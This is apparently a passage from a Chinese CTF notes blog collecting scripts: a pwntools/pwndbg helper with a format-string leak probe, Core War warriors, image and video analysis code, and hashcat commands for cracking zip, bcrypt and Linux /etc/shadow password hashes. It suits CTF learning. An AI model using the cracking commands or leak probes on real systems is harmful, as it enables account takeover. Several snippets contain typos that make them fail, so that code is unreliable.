class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>] <span class="hljs-comment">#分屏后ctrl+b o组合键切屏</span><br>p=process(<span class="hljs-string">&quot;gdb&quot;</span>)<br>sla=<span class="hljs-keyword">lambda</span> d,payload:p.sendlineafter(d,payload)<br>ia=<span class="hljs-keyword">lambda</span>:p.interactive()<br>ra=<span class="hljs-keyword">lambda</span> timeout=<span class="hljs-number">0.5</span>:p.recvall(timeout=timeout)<br>rl=<span class="hljs-keyword">lambda</span> keep=<span class="hljs-literal">False</span>:p.recvline(keepends=keep)<br>sl=<span class="hljs-keyword">lambda</span> payload:p.sendline(payload)<br>rls=<span class="hljs-keyword">lambda</span> line:p.recvlines(line)<br>ru=<span class="hljs-keyword">lambda</span> payload,drop=<span class="hljs-literal">True</span>:p.recvuntil(payload,drop)<br>cl=<span class="hljs-keyword">lambda</span>:p.close()<br>s=<span class="hljs-keyword">lambda</span> payload:p.send(payload)<br>base=<span class="hljs-number">0x555555554000</span> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PIEDebug</span>(<span class="hljs-params">file,breakpoints,params=[]</span>):<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;file <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;starti <span class="hljs-subst">&#123;<span class="hljs-string">&#x27; &#x27;</span>.join(params)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> breakpoints:<br>        sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;b *<span class="hljs-subst">&#123;base+i&#125;</span>&quot;</span>)<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_format_string</span>(<span class="hljs-params">times,start=<span class="hljs-number">0</span>,end=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    payload=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start,start+times):<br>        payload+=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>:%<span class="hljs-subst">&#123;i&#125;</span>$p&#x27;</span>+end<br>    <span class="hljs-keyword">return</span> payload[:-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_register</span>(<span class="hljs-params">reg</span>):<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">&quot;i r&quot;</span>)<br>    contents=ru(<span class="hljs-string">&quot;gs&quot;</span>).split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> contents:<br>        <span class="hljs-built_in">print</span>(i)<br>        temp=i.split()<br>        register=temp[<span class="hljs-number">0</span>]<br>        value=temp[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> reg.encode() <span class="hljs-keyword">in</span> register:<br>            <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;none&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_register</span>(<span class="hljs-params">register,value</span>):<br>    sla(<span class="hljs-string">&quot;pwndbg&gt;&quot;</span>,<span class="hljs-string">f&quot;set $<span class="hljs-subst">&#123;register&#125;</span> = <span class="hljs-subst">&#123;value&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="基础波形图绘制脚本"><a href="#基础波形图绘制脚本" class="headerlink" title="基础波形图绘制脚本"></a>基础波形图绘制脚本</h2><p><a href="https://zhuanlan.zhihu.com/p/371394137">参考</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    d=f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>traces=<span class="hljs-built_in">eval</span>(d[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<br>t=np.arange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(traces))<br>plt.plot(t, traces)<br>plt.show()<br></code></pre></td></tr></table></figure><h2 id="linux命令替代"><a href="#linux命令替代" class="headerlink" title="linux命令替代"></a>linux命令替代</h2><ul><li><a href="https://ubunlog.com/en/alternativas-al-comando-ls/">ls</a></li><li><a href="https://unix.stackexchange.com/questions/86321/how-can-i-display-the-contents-of-a-text-file-on-the-command-line">cat</a></li><li><a href="https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#specialer">Specialer</a>:<code>for f in **/*; do echo $(&lt;$f); done</code></li></ul><h2 id="Core-war"><a href="#Core-war" class="headerlink" title="Core war"></a>Core war</h2><ul><li><a href="https://corewar.co.uk/index.htm">Core War</a></li><li><a href="http://www.koth.org/info.html">koth</a></li></ul><p>以下warrior都是standard redcode。</p><p>一个稳输的自毁warrior：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-comment">;redcode</span><br><span class="hljs-comment">;assert 1</span><br><span class="hljs-keyword">ADD</span> <span class="hljs-meta">#-1, 3</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-number">2</span>, <span class="hljs-subst">@2</span><br><span class="hljs-keyword">JMP</span> <span class="hljs-number">-2</span><br>DAT <span class="hljs-meta">#0, #0</span><br></code></pre></td></tr></table></figure><p>一个稍微能赢一点的基础warrior(dwarf)：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">;redcode</span><br><span class="hljs-comment">;assert 1</span><br>start   <span class="hljs-keyword">add.ab </span> <span class="hljs-comment">#4, bmb</span><br>        mov.i   <span class="hljs-keyword">bmb, </span>@<span class="hljs-keyword">bmb</span><br><span class="hljs-keyword"></span>        <span class="hljs-keyword">jmp </span>    start<br><span class="hljs-keyword">bmb </span>    dat     <span class="hljs-comment">#0, #0</span><br></code></pre></td></tr></table></figure><p>一个胜率较高的warrior：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-comment">;redcode</span><br><span class="hljs-comment">;assert 1</span><br>        org    start<br><br>gate    dat    <span class="hljs-number">4000</span>,       <span class="hljs-number">1700</span><br>bomb    dat    &gt;<span class="hljs-number">2667</span>,      <span class="hljs-number">11</span><br><br>        for    <span class="hljs-number">4</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-meta">#4000,      &gt;gate</span><br>clear   <span class="hljs-keyword">mov</span>    bomb,       &gt;gate<br>        djn.f  clear,      &gt;gate<br><br>        for    <span class="hljs-number">23</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>        istep  equ <span class="hljs-number">1143</span>           <span class="hljs-comment">; (CORESIZE+1)/7</span><br><br>start   <span class="hljs-built_in">spl</span>    clear<span class="hljs-number">-1</span><br>        <span class="hljs-keyword">mov</span>    imp,        *launch<br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span>                  <span class="hljs-comment">; 32 parallel processes</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    <span class="hljs-number">1</span><br>        <span class="hljs-built_in">spl</span>    nxpoint<br>launch  djn.f  <span class="hljs-number">3600</span>,       &lt;<span class="hljs-number">4000</span><br><br>        for    <span class="hljs-number">2</span><br>        dat    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>        rof<br><br>nxpoint <span class="hljs-keyword">add</span>.f  <span class="hljs-meta">#istep,     launch</span><br>        djn.f  clear<span class="hljs-number">-1</span>,    &lt;<span class="hljs-number">3000</span><br><br>imp     <span class="hljs-keyword">mov</span>.i  <span class="hljs-meta">#1,         istep</span><br></code></pre></td></tr></table></figure><h2 id="打印嵌套文件夹内的所有文件内容"><a href="#打印嵌套文件夹内的所有文件内容" class="headerlink" title="打印嵌套文件夹内的所有文件内容"></a>打印嵌套文件夹内的所有文件内容</h2><p><code>find /path/to/folder -type f -exec cat &#123;&#125; \;</code></p><h2 id="python画二维码"><a href="#python画二维码" class="headerlink" title="python画二维码"></a>python画二维码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>MAX = <span class="hljs-number">100</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qr.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>m = file.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br><span class="hljs-keyword">if</span>(m[i] == <span class="hljs-string">&#x27;0&#x27;</span>):<br>pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><span class="hljs-keyword">else</span>:<br>pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>i = i+<span class="hljs-number">1</span><br>pic.save(<span class="hljs-string">&quot;res.png&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br><br>data = np.zeros((<span class="hljs-number">100</span>, <span class="hljs-number">100</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qr.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    idx = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> f:<br>        bit = <span class="hljs-built_in">int</span>(bit)<br>        data[idx // <span class="hljs-number">100</span>][idx % <span class="hljs-number">100</span>] = bit<br><br>        idx = idx + <span class="hljs-number">1</span><br><br>plt.imshow(data, interpolation = <span class="hljs-string">&quot;nearest&quot;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><h2 id="python-cv2描绘运动轨迹"><a href="#python-cv2描绘运动轨迹" class="headerlink" title="python cv2描绘运动轨迹"></a>python cv2描绘运动轨迹</h2><p>利用前后帧生成光流，如果该光流往左下走则描绘出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2,numpy <span class="hljs-keyword">as</span> np,matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>cap = cv2.VideoCapture(<span class="hljs-string">&#x27;out_flag.mp4&#x27;</span>)<br>ret, frame = cap.read()<br>gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)<br>mask = np.zeros_like(gray).astype(np.float64)<br>fr = <span class="hljs-number">0</span><br>plt.figure(figsize=(<span class="hljs-number">12</span>,<span class="hljs-number">8</span>))<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fr +=<span class="hljs-number">1</span><br>    ret, frame = cap.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>        <span class="hljs-keyword">break</span><br>    gray_next = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)<br>    flow = cv2.calcOpticalFlowFarneback(gray, gray_next, <span class="hljs-literal">None</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">0</span>)<br>    h, w = gray.shape<br>    y, x = np.mgrid[<span class="hljs-number">0</span>:h:<span class="hljs-number">10</span>, <span class="hljs-number">0</span>:w:<span class="hljs-number">10</span>].reshape(<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>).astype(<span class="hljs-built_in">int</span>)<br>    fx, fy = flow[y, x].T<br>    lines = np.vstack([x, y, x + fx, y + fy]).T.reshape(-<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>    lines = np.int32(lines + <span class="hljs-number">0.5</span>)<br>    vis = np.zeros_like(gray)<br>    <span class="hljs-keyword">for</span> (x1, y1), (x2, y2) <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> x1 &gt; x2  <span class="hljs-keyword">and</span> y1&lt;y2:<br>            cv2.line(vis, (x1, y1), (x2, y2), <span class="hljs-number">255</span> , <span class="hljs-number">2</span>)<br>    mask += vis&amp;gray<br>    <span class="hljs-keyword">if</span> fr % <span class="hljs-number">10</span> ==<span class="hljs-number">0</span>:<br>        show=mask.copy()<br>        cv2.putText(show,<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;fr&#125;</span>&#x27;</span>,(<span class="hljs-number">5</span>,<span class="hljs-number">50</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="hljs-number">0.75</span>, <span class="hljs-number">255</span>, <span class="hljs-number">2</span>)<br>        cv2.imshow(<span class="hljs-string">&#x27;frame2&#x27;</span>, show)<br>        <span class="hljs-keyword">if</span> cv2.waitKey(<span class="hljs-number">25</span>) &amp; <span class="hljs-number">0xFF</span> == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;q&#x27;</span>):<br>            <span class="hljs-keyword">break</span><br>    gray=gray_next<br>plt.imshow(np.log(mask))<br>plt.imshow(np.log(mask+<span class="hljs-number">1</span>))<br>plt.show()<br>cap.release()<br>cv2.destroyAllWindows()<br></code></pre></td></tr></table></figure><h2 id="Visual-cryptography-python脚本"><a href="#Visual-cryptography-python脚本" class="headerlink" title="Visual cryptography python脚本"></a><a href="https://en.wikipedia.org/wiki/Visual_cryptography">Visual cryptography</a> python脚本</h2><p>大概就是把两张黑白图片叠在一起，就能看见要传递的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>im1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>)<br>im2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2.png&quot;</span>)<br>iminp = np.array(im1)<br>im2np = np.array(im2)<br>result = im2np + im1inp<br>Image.fromarray(result).save(<span class="hljs-string">&#x27;result.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者把信息用白色显现出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-comment"># Load the first share</span><br>sharel = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;img1.png&quot;</span>) .convert(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># Load the second share</span><br>share2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;img2.png&quot;</span>) .convert(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># Get the size of the shares</span><br>width, height = sharel.size<br><span class="hljs-comment"># Create a new image for the result</span><br>result = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height))<br><span class="hljs-comment"># Loop through each pixel in the shares and combine them</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (width) :<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (height):<br>        pixell = sharel.getpixel((x, y))<br>        pixel2 = share2.getpixel((x, y))<br>        <span class="hljs-comment"># If both pixels are black, set the result pixel to black</span><br>        <span class="hljs-keyword">if</span> pixell == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> pixel2 == <span class="hljs-number">0</span>:<br>            result.putpixel((x, y), <span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># Otherwise, set the result pixel to white</span><br>        <span class="hljs-keyword">else</span>:<br>            result.putpixel((x, y), <span class="hljs-number">255</span>)<br><span class="hljs-comment"># Save the resulting image</span><br>result.save(<span class="hljs-string">&quot;result.png&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="perlin-noise图片生成-对比脚本"><a href="#perlin-noise图片生成-对比脚本" class="headerlink" title="perlin noise图片生成+对比脚本"></a><a href="https://en.wikipedia.org/wiki/Perlin_noise">perlin noise</a>图片生成+对比脚本</h2><p>使用python模块<a href="https://github.com/caseman/noise">noise</a>用perlin noise生成一张图片后对比另一张由perlin noise生成的图片，并把像素不同的地方标为黑色后写为结果图片。改一下也能用作两张普通图片的对比脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> noise<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment"># Set the seed for the Perlin noise generator</span><br>seed = <span class="hljs-number">2151</span><br><span class="hljs-comment"># Set the size of the image</span><br>width = <span class="hljs-number">1920</span><br>height = <span class="hljs-number">1080</span><br><span class="hljs-comment"># Set the scale of the Perlin noise</span><br>scale = <span class="hljs-number">100.0</span><br><span class="hljs-comment"># Create an empty NumPy array for the image</span><br>img_array = np.zeros((height, width))<br><span class="hljs-comment"># Loop through each pixel in the image and generate Perlin noise</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        img_array[y, x] = noise.pnoise2(x/scale, y/scale, octaves=<span class="hljs-number">6</span>, persistence=<span class="hljs-number">0.5</span>, lacunarity=<span class="hljs-number">2.0</span>,repeatx=<span class="hljs-number">1024</span>, repeaty=<span class="hljs-number">1024</span>, base=seed)<br><span class="hljs-comment"># Create a PIL image from the NumPy array</span><br>img = Image.fromarray(np.uint8(img_array * <span class="hljs-number">255</span>))<br>img.save(<span class="hljs-string">&quot;res.png&quot;</span>)<br><span class="hljs-comment"># Load the modified image</span><br>mod_img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;compare.png’&#x27;</span>)<br><span class="hljs-comment"># Create a new black image for the changed pixels</span><br>new_img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height), color=<span class="hljs-string">&#x27;black&#x27;</span>)<br><span class="hljs-comment"># Get the pixel access objects for the images</span><br>orig_pixels = img.load()<br>mod_pixels = mod_img.load()<br>new_pixels = new_img.load()<br><span class="hljs-comment"># Loop through the pixels and identify changed pixels</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        orig_pixel = orig_pixels[x, y]<br>        mod_pixel = mod_ pixels[x, y]<br>        <span class="hljs-keyword">if</span> orig_pixel != mod_pixel:<br>            <span class="hljs-comment"># Change the pixel in the new image to white</span><br>            new_pixels[x, y] = (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br><span class="hljs-comment"># Save the new image with the changed pixels in white</span><br>new_img.save(<span class="hljs-string">&#x27;changed_pixels_flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="hashcat使用"><a href="#hashcat使用" class="headerlink" title="hashcat使用"></a><a href="https://xz.aliyun.com/t/4008">hashcat使用</a></h2><p>下载：在<a href="https://hashcat.net/hashcat/">官网</a>下载hashcat binaries，然后用<code>7z x</code>解压文件即可(7zip下载：<code>sudo apt-get install p7zip-full</code>)。linux运行<code>hashcat.bin</code>,windows运行<code>hashcat.exe</code>。</p><p>今天又测试了一下这个方法，发现不行。然后发现可以直接用apt安装hashcat，但是安装后用hashcat命令也不行。最后发现用apt安装hashcat后之前下载的那个binary就能用了……</p><p>运行时指定hash模式的-m选项可以在<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">这里</a>找到。例如爆破zip，先用<a href="https://hashes.com/en/johntheripper/zip2john">zip2john</a>将zip转为hash，然后根据hash格式选择-m的参数。-a是爆破模式。</p><ul><li>掩码爆破：<code>./hashcat.bin -a 3 -m 13600 &#39;hash&#39; mask</code></li><li>字典爆破：<code>./hashcat.bin -a 0 -m 13600 &#39;hash&#39; dict</code></li></ul><p>字典爆破linux &#x2F;etc&#x2F;shadow的hash： <a href="https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/">https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/</a></p><ul><li><code>hashcat -m 500 -a 0 -o cracked.txt hashes.txt ./rockyou.txt -O</code><br>其他爆破案例：</li><li><code>hashcat -m 3200 -a 0 dict.txt hash.txt</code>：爆破bcrypt hash</li><li><code>hashcat --potfile-disable -a 3 -m 500 hash.txt -d 1</code>:爆破linux <code>/etc/shadow</code>密码hash</li></ul><h2 id="Extracting-GPS-Coordinates-from-metadata"><a href="#Extracting-GPS-Coordinates-from-metadata" class="headerlink" title="Extracting GPS Coordinates from metadata"></a>Extracting GPS Coordinates from metadata</h2><p><a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost">https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost</a></p><h2 id="利用numba和multiprocessing库加速爆破"><a href="#利用numba和multiprocessing库加速爆破" class="headerlink" title="利用numba和multiprocessing库加速爆破"></a>利用<a href="http://zhaoxuhui.top/blog/2019/01/17/PythonNumba.html">numba</a>和multiprocessing库加速爆破</h2><p>感觉任何任务量较大的爆破题都可以像这题的脚本一样，一个线程爆破一个部分，同时numba提高代码执行效率。</p><p><a href="https://github.com/TJCSec/tjctf-2023-challenges/tree/main/crypto/aluminum-isopropoxide">aluminum-isopropoxide</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> jit<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool<br><br><span class="hljs-meta">@jit(<span class="hljs-params">nopython=<span class="hljs-literal">True</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title 